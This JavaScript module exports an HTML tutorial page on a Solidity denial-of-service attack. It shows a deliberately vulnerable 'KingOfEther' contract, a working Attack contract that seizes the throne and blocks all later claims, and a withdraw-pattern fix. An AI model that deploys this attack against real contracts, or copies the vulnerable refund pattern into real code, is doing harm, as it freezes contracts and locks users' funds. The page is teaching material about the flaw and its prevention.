// metadata
export const version = "0.5.16"
export const title = "Denail of Service"
export const description = "An example of denial of service hack in Solidity"

const html = `<h3 id="vulnerability">Vulnerability</h3>
<p>There are many ways to attack a smart contract to make it unusable.</p>
<p>One exploit we introduce here is denial of service by making the function to send Ether fail.</p>
<pre><code class="language-solidity">pragma solidity ^0.5.16;
/*
The goal of KingOfEther is to become the king by sending more Ether than
the previous king. Previous king will be refunded with the amount of Ether
he sent.
*/

/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value &gt; balance, "Need to pay more to become the king");

        (bool sent, ) = king.call.value(balance)("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) public {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack wil work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone.value(msg.value)();
    }
}</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<p>One way to prevent this is to allow the users to withdraw their Ether instead of sending it.</p>
<p>Here is a example.</p>
<pre><code class="language-solidity">pragma solidity ^0.5.16;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address =&gt; uint) public balances;

    function claimThrone() external payable {
        require(msg.value &gt; balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call.value(amount)("");
        require(sent, "Failed to send Ether");
    }
}
</code></pre>
`

export default html
